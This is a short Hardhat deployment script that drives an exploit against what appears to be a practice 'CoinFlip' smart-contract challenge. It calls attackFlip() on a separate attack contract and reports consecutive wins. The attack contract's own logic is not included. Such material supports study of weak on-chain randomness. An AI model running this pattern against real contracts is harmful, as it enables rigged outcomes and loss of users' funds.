const hre = require("hardhat");

async function main() {
    // Fetch account
    const [deployer] = await ethers.getSigners();
    const INSTANCE_ADDRESS = "0xEEde9879cC30aD881aA3bEfE4b80544AD4d98D0e";
    const ATTACKER_ADDRESS = "0x93C6347f4e05f1a598892dFBb9894f91d745c4E7";

    // Deploy attack contract
    const coinFlip = await hre.ethers.getContractAt("CoinFlip", INSTANCE_ADDRESS);
    const coinFlipAttack = await hre.ethers.getContractAt("CoinFlipAttack", ATTACKER_ADDRESS);

    console.log(`CoinFlip contract fetched at ${coinFlip.address}`);
    console.log(`CoinFlipAttack contract fetched at ${coinFlipAttack.address}\n`);

    // Attack...
    const transaction = await coinFlipAttack.connect(deployer).attackFlip();
    await transaction.wait();

    console.log(`Attack complete...\n`);

    const CONSECUTIVE_WINS = await coinFlip.consecutiveWins();
    console.log(`Consecutive Wins: ${CONSECUTIVE_WINS}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});